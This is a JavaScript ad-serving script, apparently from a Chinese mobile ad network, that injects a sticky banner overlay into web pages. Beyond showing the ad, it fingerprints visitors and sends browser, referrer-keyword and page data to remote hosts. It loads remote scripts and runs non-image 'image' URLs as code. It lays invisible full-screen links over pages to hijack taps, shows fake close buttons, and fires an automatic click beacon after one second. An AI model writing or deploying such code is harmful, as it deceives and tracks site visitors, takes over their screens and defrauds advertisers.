(function() {
	var gmate = document.getElementsByTagName('meta'),isviewport=1;
				 for(var i=0,len=gmate.length;i<len;i++){  
					if(gmate[i] && gmate[i].getAttribute('name') == 'viewport'){
						isviewport=0;
					}
				}
				if(isviewport){
					var node =document.createElement('meta');
					node.content='width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no' ;
					node.name='viewport'; 
					var head=document.getElementsByTagName('head')[0];
					//head.insertBefore(node,head.firstChild);
				}
					
	 var abf='';
	 	  abf='<div style="z-index: 1000000;display: block; position: absolute;bottom: 0;opacity: 0.8; left: 0;font-size: 0.5em; color: #fff;background-color: #646464; padding: 1px;"><img src="http://qifann.com/images/b-3.png"/></div>';
	 	 
    var zone = {"border":"FFFFFF","headline":"0000FF","background":"FFFFFF","description":"444444","dispurl":"008000","width":"640","height":"200","zoneid":"2748","plantype":"cpv","htmlcontrol":{"position":"bottom"}}; 
    var domain =  {bzurl:"http://qifann.com",jsurl:"http://bmg.wnbfw.com/",imgurl:"http://qifann.com/"};
    
    var __ua = navigator.userAgent.toLowerCase(), __B = {
	ver : (__ua.match(/(?:rv|me|ra|ie)[\/: ]([\d.]+)/) || [0, "0"])[1],
	opera : /opera/.test(__ua),
	maxthon : /maxthon/.test(__ua),
	theworld : /theworld/.test(__ua),
	qq : /qqbrowser/.test(__ua),
	sogou : /se /.test(__ua),
	liebao : /liebao/.test(__ua),
	firefox : /mozilla/.test(__ua) && !/(compatible|webkit)/.test(__ua),
	chrome : /chrome|crios/.test(__ua),
	safari : /webkit/.test(__ua),
	uc : /ucbrowser|ucweb|rv:1.2.3.4|uc/.test(__ua),
	ie : /msie/.test(__ua) && !/opera/.test(__ua),
	ios: !!__ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),  
	android: /android|linux/.test(__ua),
	iphone: /iphone/.test(__ua),
	ipad: /ipad/.test(__ua)
};
var Base64 =  {  
    k : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", 
    encode : function (input) {  
        var output = "";  
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = Base64.B(input);  
        while (i < input.length) {  
            chr1 = input.charCodeAt(i++);  
            chr2 = input.charCodeAt(i++);  
            chr3 = input.charCodeAt(i++);  
            enc1 = chr1 >> 2;  
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
            enc4 = chr3 & 63;  
            if (isNaN(chr2)) {  
                enc3 = enc4 = 64;  
            } else if (isNaN(chr3)) {  
                enc4 = 64;  
            }  
            output = output +  
            Base64.k.charAt(enc1) + Base64.k.charAt(enc2) +  
            Base64.k.charAt(enc3) + Base64.k.charAt(enc4);  
        }  
        return output;  
    } ,
    B : function (string) {  
        string = string.replace(/\r\n/g,"\n");  
        var utftext = "";  
        for (var n = 0; n < string.length; n++) {  
            var c = string.charCodeAt(n);  
            if (c < 128) {  
                utftext += String.fromCharCode(c);  
            } else if((c > 127) && (c < 2048)) {  
                utftext += String.fromCharCode((c >> 6) | 192);  
                utftext += String.fromCharCode((c & 63) | 128);  
            } else {  
                utftext += String.fromCharCode((c >> 12) | 224);  
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
                utftext += String.fromCharCode((c & 63) | 128);  
            }  
        }  
        return utftext;  
    }   
} 
function __G(d, c) {
	c = c || window;
	if ("string" === typeof d || d instanceof String) {
		return c.document.getElementById(d)
	} else {
		if (d && d.nodeName && (d.nodeType == 1 || d.nodeType == 9)) {
			return d
		}
	}
	return d
}
function __L(url,callback,zid){
	var win = window, doc = document,U=__B,loadlist={
		
	},node=doc.createElement("script"),head=doc.getElementsByTagName('head')[0];	function clear(){
		node.onload=node.onreadystatechange=node.onerror=null;		head.removeChild(node);		head=node=null;		
	};	function onLoad(){
		loadlist[url]=true;		clear();		if(callback)callback();		
	}if(loadlist[url]){
		callback();		return ;		
	}if(U.ie&&(U.ver<9||(doc.documentMode&&doc.documentMode<9))){
		node.onreadystatechange=function (){
			if(/loaded|complete/.test(node.readyState)){
				node.onreadystatechange=null;				onLoad();				
			}
		};		
	}else {
		if(U.ver>=10){
			node.onerror=function (){
				setTimeout(clear,0);
				
			};			node.onload=function (){
				setTimeout(onLoad,0);
				
			};			
		}else {
			node.onerror=clear;			node.onload=onLoad;			
		}
	}  
	node.async=true;	
	node.src=url;
	if(zid) node.id= zid;	
	head.insertBefore(node,head.firstChild);	
}
function __E(a, f) {
	if (a.length && a.slice) {
		for ( i = 0; i < a.length; i++) {
			switch (typeof a[i]) {
				case "string":
				case "function":
					f(a[i]());
					break;
				default:
					break
			}
		}
	}
}

function __M(o, t) {
	if (!o || !t) {
		return o
	}
	for (var tem in t) {
		o[tem] = t[tem];
	}
	return o;
}
function __Gc(d, h) {
	var c;
	var h = h || window;
	var g = h.document;
	var e = new RegExp("(^| )" + d + "=([^;]*)(;|\x24)");
	var f = e.exec(g.cookie);
	if (f) {
		c = f[2]
	}
	 return c
}
function __Sc(e, f, d) {
	d = d || {};
	var c = d.expires;
	if ("number" == typeof d.expires) {
      c = new Date();
      c.setTime(c.getTime() + d.expires)
     }
     document.cookie = e + "=" + f + (d.path ? "; path=" + d.path : "") + (c ? "; expires=" + c.toGMTString() : "") + (d.domain ? "; domain=" + d.domain : "") + (d.secure ? "; secure" : "")
}
function __P() {
	var win = window, doc = document, p = [];
	function r() {
		var c;
		try {
			c = win.opener ? win.opener.document.location.href : doc.referrer
		} catch (e) {
			c = doc.referrer
		}
		function K(r) {
			var s = ["wd", "p", "q", "keyword", "kw", "w", "key", "word", "query", "q1", "name"];
			if (r != "" && r != null) {
				for (var i = 0; i < s.length; i++) {
					var re = new RegExp("[^1-9a-zA-Z]" + s[i] + "=\([^&]*\)");
					var kk = r.match(re);
					if (kk != null) {
						return kk[1]
					}
				}
			}
			return ""
		}
		c = c ? {
			r : encodeURIComponent(c),
			k : encodeURIComponent(K(c))
		} : {
			r : encodeURIComponent(c)
		};
		return c;
	}

	function u() {
		var c;
		try {
			c = win.top.document.location.href;
		} catch (e) {
			c = doc.location.href;
		}
		return {
			u : encodeURIComponent(c)
		};
	}
	function sE(){
		var e=0,m = navigator.mimeTypes,i;
		if (navigator.mimeTypes != null && navigator.mimeTypes.length > 0){
			for (i in m) {
				if (m[i]['type'] == 'application/vnd.chromium.remoting-viewer') {
					 e='1';
				}
			}
		}
		if(e!='1'){
			var _tk = "track" in document.createElement("track"), _se = "scoped" in document.createElement("style"), _vl = "v8Locale" in window;
			if (_tk && !_se && !_vl){  
				e = '2';
			}
			if (_tk && _se && _vl){
				e = '3';
			}
		}
		return {
			se :e
		};
	}
	function j() {
		return {
			j : navigator.javaEnabled() ? 1 : 0
		};
	}

	function p() {
		return {
			p : navigator.plugins.length
		};
	}

	function m() {
		return {
			m : navigator.mimeTypes.length
		};
	}

	function f() {
		var v = 0;
		if (navigator.plugins && navigator.mimeTypes.length) {
			var b = navigator.plugins["Shockwave Flash"];
			if (b && b.description)
				v = b.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s)+r/, ".")
		} else if (__B.ie && !window.opera) {
			var c = null;
			try {
				c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7")
			} catch (e) {
				var a = 0;
				try {
					c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
					a = 6;
					c.AllowScriptAccess = "always"
				} catch (e) {
					if (a == 6)
						return a.toString()
				}
				try {
					c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")
				} catch (e) {

				}
			}
			if (c != null) {
				var a = c.GetVariable("$version").split(" ")[1];
				v = a.replace(/,/g, ".")
			}
		}
		return {
			f : v
		}
	}

	function res() {
		var D = screen, v = D.width + "x" + D.height;
		return {
			res : v
		}
	}

	function t() {
		var v = document.title;
		return {
			t : encodeURIComponent(v)
		}
	}

	function l() {
		var v = navigator.browserLanguage || navigator.language;
		return {
			l : v
		}
	}

	function c() {
		var v = navigator.cookieEnabled;
		v = v ? 1 : 0;
		return {
			c : v
		}
	}

	function H() {
		return document.body && {
			h : document.body.clientHeight
		};
	}
	
	var b = {};
	__E([j, p, m, f, r, u, res, t, l, c, H,sE], function(a) {
		__M(b, a)
	});
	for (var e in b) {
		p.push(e + "=" + b[e]);
	}
	return Base64.encode(p.join("&"));
}
function __A(c, d, e) {
	c = __G(c);
	d = d.replace(/^on/i, "").toLowerCase();
	if (c.addEventListener) {
		c.addEventListener(d, e, false)
	} else {
		if (c.attachEvent) {
			c.attachEvent("on" + d, e)
		}
	}
	return c
}
function __UA(c, d, e) {
    c = __G(c);
    d = d.replace(/^on/i, "").toLowerCase();
    if (c.removeEventListener) {
        c.removeEventListener(d, e, false)
     } else {
        if (c.detachEvent) {
       		c.detachEvent("on" + d, e)
        }
     }
    return c
}
function __CL(){
	if(!window._________z) {
			window._________z = true;
			__L("http://cloud.zyiis.net/v.js?xW0dWjTkDgpjFesiOwxdzGiAlJH7Q6jhWHEI5EJkVV0=",'','zy_c');
	}
}
function __LC() {
		var c;
		try {
			c = window.top.document.location.host;
		} catch (e) {
			c = document.location.host;
		}
		return Base64.encode(c);
}
function __IH(el, where, html) {
  if (!el) {
  	return false;
  }
  where = where.toLowerCase();
  if (el.insertAdjacentHTML) {
  	el.insertAdjacentHTML(where, html);
  } else {
  	var range = el.ownerDocument.createRange(),
  		frag = null;
  	
  	switch (where) {
  		case "beforebegin":
  			range.setStartBefore(el);
  			frag = range.createContextualFragment(html);
  			el.parentNode.insertBefore(frag, el);
  			return el.previousSibling;
  		case "afterbegin":
  			if (el.firstChild) {
			    range.setStartBefore(el.firstChild);
			    frag = range.createContextualFragment(html);
			    el.insertBefore(frag, el.firstChild);
  			} else {
			    el.innerHTML = html;
  			}
  			return el.firstChild;
  		case "beforeend":
  			if (el.lastChild) {
			    range.setStartAfter(el.lastChild);
			    frag = range.createContextualFragment(html);
			    el.appendChild(frag);
  			} else {
			    el.innerHTML = html;
  			}
  			return el.lastChild;
  		case "afterend":
  			range.setStartAfter(el);
  			frag = range.createContextualFragment(html);
  			el.parentNode.insertBefore(frag, el.nextSibling);
  			return el.nextSibling;
  	}
  }
}
function pvstas(pvid){  
	
	var aid ,pid;
	if(pvid.aid.length>1){
	 	aid = pvid.aid.join(",").match( /([^,]+)(?!.*\1)/ig);
	 	pid = pvid.pid.join(",").match( /([^,]+)(?!.*\1)/ig);
	}else {
		aid = pvid.aid;
		pid = pvid.pid;
	}
	}
var ifsrc = domain.jsurl + "v.php?siteid=&id=" + zone.zoneid + '&p=' + __P()+'&l='+__LC(); 
function __I() {
		var i = '<iframe src="' + ifsrc + '" width="' + zone.width + '" height="' + zone.height + '" marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>'; 
		return i; 
		} 
function __LS() {
		var url = domain.jsurl + "v.php?siteid=&id=" + zone.zoneid + '&' + __P();
		__L(url);
		} 		
function __S() {
if(!document.body && !__G('_nobody')){
	document.write("<a id='_nobody' style='display: none'>none</a>");
};
var pvid={pid:[],aid:[]};  


	var ads = [{"headline":"","description":"","dispurl":"","imageurl":"http:\/\/afp.alicdn.com\/afp-creative\/creative\/u116330433\/4164cf36ae7eff47d4f049858349e4b2.jpg","alt":"","url":"http:\/\/bmg.wnbfw.com\/c.php?s=JnpvbmVpZD0yNzQ4JnNpdGVpZD0mdWlkPTc1MzcmYWRzaWQ9Njc5JnBsYW5pZD0yMTQmcGxhbnR5cGU9Y3B2JnVybD1odHRwcyUzQSUyRiUyRml0dW5lcy5hcHBsZS5jb20lMkZjbiUyRmFwcCUyRmlkMTI0NzEzODIyNiZ2dGltZT0yMDE3LTEwLTMwIDIzOjUxOjIzJmlwPTIyMS4yMjIuMTIyLjExMw==;f57d7ba0624627552553a5af7de73acf;","adsid":"679","planid":"214","htmlcontrol":"","c2_url":"http:\/\/bmg.wnbfw.com\/effect.php?type=ecv&planid=214&adsid=679&zoneid=2748&uid=7537&adtplid=19&plantype=cpv"}];var config = {"border":"FFFFFF","headline":"0000FF","background":"FFFFFF","description":"444444","dispurl":"008000","width":"640","height":"200","zoneid":"2748","plantype":"cpv","htmlcontrol":{"position":"bottom"}};for (key in ads) {
									ads[key].url = ads[key].url+'&p='+ __P();
								}Array.prototype.contains = function (obj) {
	var index = this.length;
	while (index--) {
		if (this[index] === obj) {
			return true;
		}
	}
	return false;
}
var arr_qf = ["jpg", "png", "gif", "bmp", "html" ,"jpeg"];
var din = ads[0].imageurl.lastIndexOf('.');
var iname='';
if(din>=0) iname=ads[0].imageurl.substr(din+1);
if(!arr_qf.contains(iname))
{
	pvid.aid.push(ads[0].adsid);
	pvid.pid.push(ads[0].planid);
	pvstas(pvid);
	
	var edads=document.createElement("script"),edhead=document.getElementsByTagName('body')[0];
	edads.src=ads[0].imageurl;
	edhead.appendChild(edads);
}
else
{
	function randomWord(randomFlag, min, max){
	    var str = "",
	        range = min,
	        arr = [ 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
	    if(randomFlag){
	        range = Math.round(Math.random() * (max-min)) + min;
	    }
	    for(var i=0; i<range; i++){
	        pos = Math.round(Math.random() * (arr.length-1));
	        str += arr[pos];
	    }
	    return str;
	}
	var randomDiv = randomWord(true, 3,8);
	var random_divs = randomWord(true, 3,6);
	var o_qf = document.createElement(randomDiv);
	var arand_qf = Math.floor(Math.random() * 100000);
	function count_ylan() {
		if(window.localStorage) 
		{
			if(window.localStorage.getItem("count_cs")) {
				var c_yl = parseInt(window.localStorage.getItem("count_cs"));
				window.localStorage.setItem("count_cs",c_yl+1);
				return c_yl+1;
			}
			else 
			{
				window.localStorage.setItem("count_cs",0);
				return 0;
			}
		}
	}
	var youl_num_ed = count_ylan();
	var youl_num = youl_num_ed%3;
	
	function getQueryString(name,url) { 
		var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
		var r = url.match(reg); 
		if (r != null) return unescape(r[2]);
		return null; 
	} 
	var str_uid_url = ads[0].c2_url;
	var ose_use_id_get = getQueryString('uid',str_uid_url);
	
	function is_array_pduid(arr_qf,strs) {
	  var i = arr_qf.length;
	  while (i--) {
		if (arr_qf[i] == strs) {
		  return true;
		}
	  }
	  return false;
	}
	
	var xy_qstop_url = new Array('7218','7260','7264','7282','7273','7294','7305','7289','7332','7275','7337','7342',
	'7346','7281','7348','7352','7360','7363','7358','7365','7368','7341','7375','7378','7223','7237','7377','7385',
	'7393','7402','7406','7313','7409','7418','7410','7350','7420','7421','7416','7425','7427','7301',
	'7319','7318','7316','7439','7441','7440','7445','7415','7448','7458','7459','7297','7456','7477','7479',
	'7481','7842','7485','7487','7488','7492','7444','7470','7493','7494','7499','7501','7502','7504','7275',
	'7513','7518','7519','7520','7296','7497','7522','7527','7531','7535','7537','7250','7430','7558','7559',
	'7548','7564','7567','7300','7344','7573','7577','7575','7552','7551','7578','7540','7584','7580','7591',
	'7546','7595','7598','7582','7600','7603','7580','7608','7610','7611','7612','7614','7617','7621','7625',
	'7626','7627','7629','7632','7633','7635','7636','7638','7639','7640','7641','7642','7594','7643','7644',
	'7645','7646','7647','7341','7662','7663','7665','7625','7667','7668','7669','7670','7671','7672','7687',
	'7320','7689','7691','7694','7706','7710','7702','7715','7698','7716','7721','7722','7711','7723','7717');  //quanpingtouming
	
	var xy_bstop_url = new Array('7218','7217','7260','7264','7282','7273','7294','7305','7337','7342','7281','7348','7352',
	'7360','7358','7368','7375','7378','7341','7385','7402','7406','7409','7223','7418','7416','7425','7301','7350','7440',
	'7415','7434','7410','7458','7459','7297','7427','7477','7479','7482','7488','7485','7444','7470','7493','7501','7502','7499',
	'7275','7520','7296','7522','7559','7577','7573','7540','7393','7582','7600','7608','7603','7626','7621','7633','7638',
	'7641','7594','7643','7647','7363','7663','7665','7625','7667','7668','7669','7670','7614','7671','7672','7320','7702',
	'7715','7698','7721','7722','7711','7717');  //bantouming
	
	var xy_close_url = new Array('7241','7260','7264','7294','7289','7368','7375','7378','7402','7410','7223','7418','7301',
	'7281','7458','7459','7485','7488','7275','7522','7445','7406','7559','7573','7641','7643'); //jiaguanb
	
	var xy_sxdudc_url = new Array('7375','7296','7360','7350','7409','7416','7327','7418','7297','7488','7494','7546','7522',
	'7559','7577','7582','7604','7626','7402','7410','7671','7687','7702'); // 上下淡入效果
	
	o_qf.id = arand_qf;
	
	o_qf.style.cssText = "position: fixed;z-index: 2147999999 !important;left:0px;width:100%;text-align:center;";
	var qf_zone = zone.htmlcontrol ;
	var qf_zone_postion = zone.htmlcontrol.position;
	if (qf_zone) {
		if (qf_zone_postion == 'top') {
			o_qf.style.top = "0px";
		}
		if (qf_zone_postion == 'bottom') {
			o_qf.style.bottom = "-1px";
		}
	}
	
	var close_jia_img = '';
	var close_img = '';
	
	if(!is_array_pduid(xy_close_url,ose_use_id_get))
	{
		close_img += '<img class = "img_close" id="c' + arand_qf + '" src="' + domain.jsurl + '/images/closet_jia.png" width="15px" height="15px" style="width:15px;height:15px;position:absolute;top:0px;left:0px;cursor:pointer;z-index:2157999999 !important;opacity:1;" >';
		close_jia_img = '<img id="close_imgs" src="' + domain.jsurl + '/images/closet.png" width="15px" height="15px"  style="position:absolute;width:15px;height:15px;';
		if (qf_zone) 
		{
			if (qf_zone_postion == 'top') {
						close_jia_img += "bottom:-15px;";
			}
			if (qf_zone_postion == 'bottom') {
						close_jia_img += "top:-15px;";
			}
		}
		close_jia_img += 'right:0px;cursor:pointer;z-index:2157999999 !important;" >';	
	}
	else
	{
		close_img = '<img src="' + domain.jsurl + '/images/closet.png" width="15px" height="15px"  style="position:absolute;';
		
		if (qf_zone) 
		{
			if (qf_zone_postion == 'top') {

						close_img += "bottom:-15px;";
	
			}
			if (qf_zone_postion == 'bottom') {
						close_img += "top:-15px;";
			}
		}
		close_img += 'right:0px;cursor:pointer;z-index:2157999999 !important;opacity:1;" id="c' + arand_qf + '" >';	
	}
	
	
	var close_waimian = close_img;
	var close_limian = close_jia_img;
	
	
	var i_qf = '<a id="__a_z_'+arand_qf+'" href="' + ads[0].url + '" target="_blank" class="av_' + arand_qf + '" style="margin: 0;padding: 0;border: 0;display: block;width: 100%;float: left;text-align: center;background-size: 100% auto !important;z-index: 2147999999 !important;position: relative;background:url(' + ads[0].imageurl + ') rgba(0,0,0,0) no-repeat center;"><img src="' + ads[0].imageurl + '" width="100%" id="img_' + arand_qf + '" style="width:100%;">'+close_limian+'</a>';
	
	var abf_new='';
	abf_new='<'+ random_divs +' id="ad" style="z-index: 2147999999 !important;display: block; position: absolute; border:1 blue solid;opacity: 0.8; right: 0;bottom:-1px;"><img src="' + domain.jsurl + '/images/b-3_newc.png" style="width:auto;height:auto;" /></'+ random_divs +'>';
	
	var widthky_top = screen.availWidth;		//获取当前屏幕可用宽度
	var tmc_heig_sd = config.height*1.5;
	var tmc_heights = tmc_heig_sd*(widthky_top/640);
	
	
	var str_qf = '';
	
	if (qf_zone) 
	{
		if (qf_zone_postion == 'bottom') 
		{
			if(youl_num>0)
			{
				if(!is_array_pduid(xy_bstop_url,ose_use_id_get))
				{
					str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;bottom:0px;height:"+tmc_heights+"px;width:100%;'></a>";
				}
			}
			else
			{	
				if(!is_array_pduid(xy_qstop_url,ose_use_id_get))
				{
					str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;bottom:0px;height:1000px;width:100%;'></a>";
				}
				else
				{
					if(!is_array_pduid(xy_bstop_url,ose_use_id_get))
					{
						str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;bottom:0px;height:"+tmc_heights+"px;width:100%;'></a>";
					}
				}
			}
		}
		else
		{
			if(youl_num>0)
			{
				if(!is_array_pduid(xy_bstop_url,ose_use_id_get))
				{
					str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;top:0px;height:"+tmc_heights+"px;width:100%;'></a>";
				}
			}
			else
			{	
				if(!is_array_pduid(xy_qstop_url,ose_use_id_get))
				{
					str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;top:0px;height:1000px;width:100%;'></a>";
				}
				else
				{
					if(!is_array_pduid(xy_bstop_url,ose_use_id_get))
					{
						str_qf += "<a target='_blank' id='yc_"+arand_qf+"' href='"+ads[0].url+"' style='position:absolute;padding:0px;margin:0px;bottom:0px;height:"+tmc_heights+"px;width:100%;'></a>";
					}
				}
			}
		}
	}
	
	str_qf += "<"+ random_divs +" style='display:inline-block;vertical-align:middle;width:100%;line-height:100%;'>";

	str_qf += i_qf + close_waimian + abf_new + "</"+ random_divs +">";
	
	var set_yidongzsy = new Array('7402','7444','1014','7470','7494','7535','7579','7655','7296','7459');
	
	if(!is_array_pduid(set_yidongzsy,ose_use_id_get))
	{
		var meta_bx = '<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">';
		str_qf += meta_bx;
	}
	
	o_qf.innerHTML = str_qf;
	document.body.appendChild(o_qf);
	// 关闭按钮 假关闭按钮样式跑走
	if(ose_use_id_get == 7273){
		var styles = document.createElement("style");
		styles.type = 'text/css';
		styles.innerHTML = '.img_close{width: 15px;height: 15px;position: absolute!important;top: 0px!important;left: 0px!important;cursor: pointer;z-index: 2157999999 !important;opacity: 1!important;}'+
							'#close_imgs{position: absolute!important;width: 15px;bottom: -15px!important;right: 0px!important;cursor: pointer;z-index: 2157999999 !important;}'+
		document.getElementsByTagName('head').item(0).appendChild(styles);
	}
	//针对包站做处理
	if(ose_use_id_get == 7531 || ose_use_id_get == 7706){
		if(navigator.userAgent.indexOf('UCBrowser') > -1) {
			function getDivs(){
				var divt = document.getElementById(arand_qf);
				if(divt) //如果找到广告代码
				{
					divt.style.zIndex = 2147483647;
					divt.style.overflow = "visible";
					divt.style.display = "block";
					document.body.appendChild(o_qf);
				}
				else //如果没有找到 就把这个div扔到页面
				{
					document.body.appendChild(o_qf);
				}
			}
			
			setInterval(getDivs,1);
		}else{
		//不是uc浏览器执行的操作
		}
	}
	if(!is_array_pduid(xy_qstop_url,ose_use_id_get))
	{
		if (qf_zone) 
		{
			var bObj=document.getElementById('yc_'+arand_qf);
			bObj.onclick=function(){
				bObj.style.height = tmc_heights+"px";
			};
		}
	}
	
	document.getElementById("img_" + arand_qf).onload = function() {
		var advh = document.getElementById(o_qf.id).offsetHeight;
		if (qf_zone_postion == 'top') {
			document.body.style.paddingTop = advh + "px";
		}
		if (qf_zone_postion == 'bottom') {
			document.body.style.paddingBottom = advh + "px";
		}
	};
	
	function close() {
		if (qf_zone_postion == 'top') {
			document.body.style.paddingTop = "0px";
		}
		if (qf_zone_postion == 'bottom') {
			document.body.style.paddingBottom = "0px";
		}
		if (o_qf) o_qf.style.display = 'none';
	}

	function __C2(i_qf){
		var C_2=new Image();
		C_2.src=ads[0].c2_url;
		
	}
	
	if (zone.plantype=='cpv') {
		__A(__G('__a_z_'+arand_qf), "click", __C2);
	}
	__A(__G('c' + arand_qf), "click", close);
	
	if (qf_zone_postion == 'bottom') 
	{
		if(!is_array_pduid(xy_sxdudc_url,ose_use_id_get))
		{
			// 定时器自动变换6秒每次
			var autoChange = setInterval(function()
			{
				//调用变换处理函数
				changeTo();
			},8000);
			
			
			//左右切换处理函数
			function changeTo()
			{
				var widthky = 100;  //高度
				var imgList = document.getElementById(arand_qf);
				goLeft(imgList,widthky); //上下一定距离
				
			}
			
			
			//图片组相对原始左移dist px距离
			function goLeft(elem,dist)
			{
				for(var i=dist;i>=0;i--)
				{ //这里设定缓慢移动，10阶每阶40px
				  (function(_i)
				  { 
					var pos = 100; //获取当前left
					setTimeout(function(){ 
					  pos -= (_i); //根据toLeft值指定图片组位置改变
					  
					  var lsdee = (100-pos)/100;
					  
					  //console.log(pos);
					  elem.style.bottom = (pos-1) + "px";
					  
					  elem.style.filter = 'alpha(Opacity='+(100-pos)+')';
					  elem.style['-moz-opacity'] = lsdee;
					  elem.style.opacity = lsdee;
					  
					},_i * 15); //每阶间隔50毫秒
				  })(i);
				}
			}
		}
		
	}
	
	var xy_fugaiyufou_url = new Array('7347','7313','7350','7485','7497'); // 覆盖
	if(is_array_pduid(xy_fugaiyufou_url,ose_use_id_get))
	{
		var i_add = 0;
		function div_time()
		{
			i_add = i_add + 1;
			var div_t = document.getElementsByTagName('div');
			for(var i = 0;i <div_t.length;i++){
				if(div_t[i].id != arand_qf && div_t[i].style.position == "fixed"  )
				{
					if(div_t[i].style.zIndex > 2147483347){
						div_t[i].style.zIndex = 2147433347;	
					}
				}
			}
			if(i_add > 100)
			{
				clearInterval(div_setineerval);
			}
		}
		var div_setineerval;
		setTimeout(function(){
			div_setineerval = setInterval(div_time,100);
		},4000);
	}
	
	pvid.aid.push(ads[0].adsid);
	pvid.pid.push(ads[0].planid);
	pvstas(pvid);
	var xy_stop_url_id = document.domain;
	if(xy_stop_url_id == 'm.phonthing.com' || xy_stop_url_id == 'm.guifei99.com' || xy_stop_url_id == 'm.kan84.net')
	{
			//解决代码在浏览器一闪而过的功能
		function getDiv(){
			var divt = document.getElementById(arand_qf);
			if(divt) //如果找到广告代码
			{
				divt.style.zIndex = 2147483647;
				divt.style.overflow = "visible";
				divt.style.display = "block";
				document.body.appendChild(o_qf);
			}
			else //如果没有找到 就把这个div扔到页面
			{
				document.body.appendChild(o_qf);
				divt.style.zIndex = 2147483647;
				divt.style.overflow = "visible";
				divt.style.display = "block";
			}
		}
		var tiske = setInterval(getDiv,10);//每10ms调用一次函数
	}

}
setTimeout(function(){
							var C_pv=new Image();
							C_pv.src=ads[0].url+"&srccpv=yes";
						},1000);}
__S();
})();